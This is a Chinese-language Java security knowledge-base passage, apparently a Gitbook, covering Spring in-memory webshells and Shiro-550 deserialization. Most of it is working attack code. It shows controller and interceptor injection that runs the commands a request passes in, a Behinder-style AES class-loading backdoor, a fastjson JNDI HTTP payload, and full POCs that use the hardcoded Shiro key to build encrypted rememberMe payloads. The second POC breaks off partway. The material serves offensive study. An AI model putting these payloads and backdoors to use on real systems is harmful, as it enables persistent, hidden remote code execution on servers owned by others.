org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import java.util.*; @Controller public class HelloWorldController extends ClassLoader { private final String uri = \"/test\"; private final String k = \"e45e329feb5d925b\"; public HelloWorldController(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); // 调用父类的defineClass函数 } public HelloWorldController() { } public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } @RequestMapping(value = \"/hello\") public String hello(Model model) throws ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 2. 从context中获得 RequestMappingHandlerMapping 的实例 RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()) { String urlPath = (String) urlIterator.next(); if (\"/test\".equals(urlPath)) { System.out.println(\"url已存在\"); return \"hello\"; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = HelloWorldController.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/test\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象 HelloWorldController injectToController = new HelloWorldController(); mappingHandlerMapping.registerMapping(info, injectToController, method2); model.addAttribute(\"name\", \"aaron\"); return \"hello\"; } } 问题 为什么会添加一个空构造函数（缺省构造函数）？ 由于在当前类里面定义了“有参构造方法”，这样的话在实例化的时候，没有传参，就会出现此异常，需要添加一个覆盖原先的“无参构造方法”，所以在类里面加上“无参构造方法”就可以解决问题了 sun.misc.BASE64Decoder().decodeBuffer(base64String) jdk11+不支持，使用jdk8可直接使用，如果目标环境是jdk8+，那么建议自己写一个base64解码器来解码 ClassLoader.getSystemClassLoader() 如果随意给定某个继承自ClassLoader的类，可能会出现报错java.lang.LinkageError : attempted duplicate class definition for name。这是因为需要使用getSystemClassLoader()获取创建ClassLoader时需要添加委派父级 拦截器 拦截器(Interceptor)在开发中处于非常重要的环节，全局拦截器可以针对接口授权情况进行放行或拦截，也可以进行身份验证，不满足则直接拦截，所有的请求都会先经过拦截器，然后才到达Controller，执行，最后返回，所以如果能动态注册一个拦截器，对所有的请求进行拦截，等到得到了我们设置的参数，再进行操作 手工创建拦截器 首先创建一个类 package com.spring.Interceptor; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class TestInterceptor extends HandlerInterceptorAdapter { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response,Object handler){ String code = request.getParameter(\"code\"); if(code !=null){ try{ Runtime.getRuntime().exec(\"calc.exe\"); }catch (IOException e){ e.printStackTrace(); } } return true; } } 然后在dispatcher-Servlet.xml 配置 当访问hello路由的时候，就会触发拦截器 这里一定得有路由，如果没有注册hello这个路由，那么拦截器就无效果 分析拦截器的整个过程 完整的调用链如下所示： preHandle:20, TestInterceptor (com.spring.Interceptor) applyPreHandle:133, HandlerExecutionChain (org.springframework.web.servlet) doDispatch:962, DispatcherServlet (org.springframework.web.servlet) doService:901, DispatcherServlet (org.springframework.web.servlet) processRequest:970, FrameworkServlet (org.springframework.web.servlet) doGet:861, FrameworkServlet (org.springframework.web.servlet) service:626, HttpServlet (javax.servlet.http) service:846, FrameworkServlet (org.springframework.web.servlet) service:733, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:201, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:544, AuthenticatorBase (org.apache.catalina.authenticator) invoke:143, StandardHostValve (org.apache.catalina.core) invoke:81, ErrorReportValve (org.apache.catalina.valves) invoke:698, AbstractAccessLogValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:364, CoyoteAdapter (org.apache.catalina.connector) service:616, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1629, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 关键的点在于doDispatch方法处，先通过getHandler方法获取了mappedHandler对象 在后方调用mappedHandler的applyPreHandler方法 这个方法中就是依次调用每个interceptor实例的preHandle方法，实际上就进入了前面写好的TestInterceptor类的preHandle方法中 在这里就有去调用写的TestInterceptor类中的preHandle方法 最后到我们写的方法中，执行完成返回true，至此就完成拦截器的调用 动态注入 跟踪mappedHandler的获取过程，先是调用了org.springframework.web.servlet.DispatcherServlet中的getHandler方法 跟进getHandler方法，遍历了this.handlerMappings 跟进getHandler(request)方法， 发现是调用的是AbstractHandlerMapping (org.springframework.web.servlet.handler) 也就是org.springframework.web.servlet.handler.AbstractHandlerMapping类中getHandler方法 再跟进getHandlerExecutionChain方法 发现其中会遍历adaptedInterceptors这数组，并判断获取的interceptor实例是不是MappedInterceptor类的实例对象，而MappedInterceptor类就是对拦截器HandlerInterceptor接口的实现，所以前面定义的TestInterceptor自然会被加入chain中并返回 那么如果我们能将恶意的interceptor实例添加到org.springframework.web.servlet.handler.AbstractHandlerMapping类的实例对象的adaptedInterceptors中，那么就可以完成动态注入那么关键就在于找到org.springframework.web.servlet.handler.AbstractHandlerMapping类的实例对象，CTRL+ALT+B找到所有AbstractHandlerMapping的子类，并在beanFactory的beanDefinitionNames中找到它的实例 因此可以通过context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\")获取该对象，再反射获取其中的adaptedInterceptors属性，并添加恶意interceptor实例对象即可完成内存马的注入 实例 0x1 注入普通马 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @Controller public class Test extends HandlerInterceptorAdapter { @RequestMapping(value = \"/a\") public String test() throws NoSuchFieldException, IllegalAccessException { // 获取当前上下文的dispatch-servletContext WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 从context中获取AbstractHandlerMapping的实例对象 org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 反射获取adaptedInterceptors属性 java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); System.out.println(adaptedInterceptors); System.out.println(adaptedInterceptors.get(0).getClass().toString()); // 避免重复 for(Object object : adaptedInterceptors){ if(object instanceof Test){ System.out.println(\"已经添加过Test实例了\"); return \"hello\"; } } // 向添加恶意的interceptor实例对象 Test test = new Test(); adaptedInterceptors.add(test); return \"hello\"; } public Test(){} // 复写 prehandle方法 @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{ String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { java.lang.Runtime.getRuntime().exec(code); return true; } else { return true; } } } 访问该路由之后，如下所示，在 adaptedInterceptors 数组中已经有添加过的恶意添加的interceptor 最后在如下所示code参数添加命令，则可以直接执行命令 0x2 注入冰蝎马 原理同controller注入冰蝎马 package com.spring.Controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.util.HashMap; import java.util.Map; @Controller public class Test extends HandlerInterceptorAdapter { private final String k = \"e45e329feb5d925b\"; @RequestMapping(value = \"/a\") public String test() throws NoSuchFieldException, IllegalAccessException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); System.out.println(adaptedInterceptors); System.out.println(adaptedInterceptors.get(0).getClass().toString()); for(Object object : adaptedInterceptors){ if(object instanceof Test){ System.out.println(\"已经添加过Test实例了\"); return \"hello\"; } } Test test = new Test(); adaptedInterceptors.add(test); return \"hello\"; } public Test(){} @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception{ String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { behinder(); return true; } else { return true; } } public HttpServletResponse behinder() throws Exception { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } } 无文件落地注入 这里我使用maven添加fastjson 1.2.24,使用jndi注入，当newInsatnce之后注册路由，并在此路由上绑定对应Controller 0x1 jndi 测试 Spring 要解析客户端发送的json数据，大部分是使用Jackson,fastjson也可以 首先引入依赖 com.alibaba fastjson 1.2.24 然后在Controller里写入由fastjson解析json对象的方法 @RequestMapping(value = \"/testjson\", consumes = {\"application/json\"}, produces = {\"application/json\"}) @ResponseBody public String showUserListInJson(HttpServletRequest request,HttpServletResponse response) throws IOException { BufferedReader bufferedReader = request.getReader(); String bodyStr,body = \"\"; while((bodyStr = bufferedReader.readLine()) != null){ body += bodyStr; } System.out.println(body); System.out.println(JSON.parse(body)); return body; } package com.spring.Controller; public class User { private Integer userId = 0; private String userName = \"\"; public User(){} public Integer getUserId() { return this.userId; } public void setUserId(Integer userId) { System.out.println(\"set running\"); this.userId = userId; } public String getUserName() { return this.userName; } public void setUserName(String userName) { System.out.println(\"set running\"); this.userName = userName; } @Override public String toString(){ return \"User{\" + \"name='\" + userName + '\\'' + ',' + \"id='\" + userId + '\\'' + '}'; } } public class Exec { public Exec() { System.out.println(\"hello world\"); } } 启动web，启动marshalsec，发送如下payload POST /testjson HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"91\", \" Not;A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 112 { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://127.0.0.1:1389/abc\", \"autoCommit\":true } 0x2 jndi 注入冰蝎马 如果执行的字节码文件需要不用引入其他包，那么直接执行Runtime.getRuntime.exec即可执行命令，反弹shell等操作，但是如果需要在spring 应用中注入，那么需要使用spring相关的包，才能获取到对应的context，在这里需要使用maven项目，添加对应的spring 包，或者有jar包也可以直接添加到lib文件里，然后用idea编译成class文件，对应在target目录下 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import java.util.*; public class Exec extends ClassLoader{ private final String k = \"e45e329feb5d925b\"; public Exec(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); // 调用父类的defineClass函数 } public Exec(String aaa){} public Exec() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 可选步骤，判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/jnditest\".equals(urlPath)){ System.out.println(\"url已存在\"); return; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = Exec.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/jnditest\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环 Exec injectToController = new Exec(\"aaa\"); mappingHandlerMapping.registerMapping(info, injectToController, method2); System.out.println(\"hello world\"); } // controller指定的处理方法 public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); Exec helloWorldController = new Exec(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } } 生成的Exec.class 问题总结 编译的时候，jdk最好选择服务器对应的jdk版本，jdk11 和 jdk8 跨大版本，在编译成功之后使用jndi注入会报错，而且是十分致命的错误 maven项目，尽量也要选择与目标主机spring相差不大的版本，保证能获取到Context 参考链接 https://landgrey.me/blog/19/ https://landgrey.me/blog/12/ https://www.anquanke.com/post/id/198886#h2-0 https://www.cnblogs.com/bitterz/p/14820898.html https://www.cnblogs.com/wudb/archive/2017/08/31/7458856.html https://www.cnblogs.com/DDgougou/p/9621675.html https://blog.csdn.net/xcxy2015/article/details/80746614 https://stackoverflow.com/questions/34414906/classloading-using-different-versions-of-the-same-class-java-lang-linkageerror https://blog.csdn.net/weixin_44411569/article/details/91379483 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:35:34 "},"知识库/02.JAVA安全/13.Shiro550分析/":{"url":"知识库/02.JAVA安全/13.Shiro550分析/","title":"13.Shiro550分析","keywords":"","body":"简介 Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。 在Shiro 环境搭建 在这里选择下载源码来搭建，下载好之后使用最简单的servlet来搭建靶场，倒入shiro-shiro-root-1.2.4 -> samples -> web -> pom.xml 在配置完成之后，打开打开会报如下错 解决办法 下载JSTL标签库，并将其导入IDEA中，如下所示 然后再导入到对应war包里 启动项目如下所示 此时可以看见项目自带了Commons Collections 3.2.1 ，但是在war 包的依赖里没有，这里再将Commons Collections 3.2.1 添加到war包里 自此环境搭建成功 攻击流程 漏洞触发主要有4步 传入Cookie rememberMe BASE64解码 AES解码 反序列化 第1步可以看到shiro的主要特征，就是在Response 的Set-Cookie: rememberMe=deleteMe;一般在登录处就可以看到，由于改项目是一个很简单的servlet，没有很复杂的Controller设计，都是通过Cookie来控制的身份认证 第2步是在Request中的Cookie: rememberMe:xxx进行base64解码 第3步则是将第2步解码的数据进行AES解码，AES是对称加密算法，如果能得知密钥那么加解密就完全受控制了 第4步则是将AES解密算法解密后的数据，进行反序列化，也就是readObject() 那么我们在生成payload的时候，要完成对应AES加密，在AES加密的过程中就需要得知对应的密钥，在此可以知道，shiro // AbstractRememberMeManager.java // 硬编码的密钥 private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); // 加密算法 public ByteSource encrypt(byte[] plaintext, byte[] key) { byte[] ivBytes = null; boolean generate = this.isGenerateInitializationVectors(false); if (generate) { ivBytes = this.generateInitializationVector(false); if (ivBytes == null || ivBytes.length == 0) { throw new IllegalStateException(\"Initialization vector generation is enabled - generated vectorcannot be null or empty.\"); } } return this.encrypt(plaintext, key, ivBytes, generate); } private ByteSource encrypt(byte[] plaintext, byte[] key, byte[] iv, boolean prependIv) throws CryptoException { int MODE = true; byte[] output; if (prependIv && iv != null && iv.length > 0) { byte[] encrypted = this.crypt(plaintext, key, iv, 1); output = new byte[iv.length + encrypted.length]; System.arraycopy(iv, 0, output, 0, iv.length); System.arraycopy(encrypted, 0, output, iv.length, encrypted.length); } else { output = this.crypt(plaintext, key, iv, 1); } if (log.isTraceEnabled()) { log.trace(\"Incoming plaintext of size \" + (plaintext != null ? plaintext.length : 0) + \". Ciphertext \" + \"byte array is size \" + (output != null ? output.length : 0)); } return Util.bytes(output); } 所以客户端生成对应的加密代码就可以这样写 byte[] payloads = byte[] seariaz_data AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); 问题说明 在复现过程中，由于shiro默认使用的commons collections 版本号是3.2.1 但是在复现的过程中，在tomcat下无法直接利用 commons-collections:3.2.1 的问题 0X1 org.apache.shiro.io.DefaultSerializer.deserialize:40 这里我们直接看反序列化发生的点，第49行使用了 ClassResolvingObjectInputStream 类而非传统的 ObjectInputStream .这里可能是开发人员做的一种防护措施？ 跟进readObject方法，他重写了 ObjectInputStream 类的 resolveClass 函数， ObjectInputStream 的 resolveClass 函数用的是 Class.forName 类获取当前描述器所指代的类的Class对象 0x2 org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass:20 然而重写后的 resolveClass 函数，采用的是 ClassUtils.forName ，我们继续看这个forName的实现。 0x3 org.apache.shiro.util.ClassUtils.forName:59 在这里可以看到与父类的forName方法不一样，再来看看这个 ExceptionIgnoringAccessor 是怎么实现的 这里实际上调用了 ParallelWebAppClassLoader 父类 WebappClassLoaderBase 的 loadClass 函数 该loadClass载入按照上述的顺序（这里不贴代码了，找到 org.apache.catalina.loader.WebappClassLoaderBase.loadClass 即可），先从cache中找已载入的类，如果前3点都没找到，再通过父类 URLClassLoader 的 loadClass 函数载入。但是实际上此时loadClass的参数name值带上了数组的标志，即 /Lorg/apache/commons/collections/Transformer;.class 那么找到原因之后，简单来说，只要使用Transformer链式调用transform()函数，都无法利用成功，那么在commons collections 3.2.1中就不使用Transformer类，那么POC如下 POC1 这里改改CC6(ysoserial) package com.test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import sun.misc.BASE64Decoder; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestLazyMap { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cls = pool.makeClass(\"Cat\"); String cmdlist = \"open /System/Applications/Calculator.app\"; String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\"+cmdlist+\"\\\");\"; cls.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\" + System.nanoTime(); cls.setName(randomName); cls.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cls.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformer); TiedMapEntry entry = new TiedMapEntry(lazyMap, templates); HashSet map = new HashSet(1); map.add(\"foo\"); Field f3 = null; try { f3 = HashSet.class.getDeclaredField(\"map\"); } catch (NoSuchFieldException e) { f3 = HashSet.class.getDeclaredField(\"backingMap\"); } f3.setAccessible(true); HashMap innimpl = null; innimpl = (HashMap) f3.get(map); Field f4 = null; try { f4 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f4 = HashMap.class.getDeclaredField(\"elementData\"); } f4.setAccessible(true); Object[] array = new Object[0]; array = (Object[]) f4.get(innimpl); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ keyField = node.getClass().getDeclaredField(\"key\"); }catch(Exception e){ keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); Field f5 = transformer.getClass().getDeclaredField(\"iMethodName\"); f5.setAccessible(true); f5.set(transformer,\"newTransformer\"); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); byte[] payloads = byteArrayOutputStream.toByteArray(); AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } POC2 package com.test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import sun.misc.BASE64Decoder; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestLazyMap { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cls = pool.makeClass(\"Cat\"); String cmdlist = \"open /System/Applications/Calculator.app\"; String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\"+cmdlist+\"\\\");\"; cls.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\" + System.nanoTime(); cls.setName(randomName); cls.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cls.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); 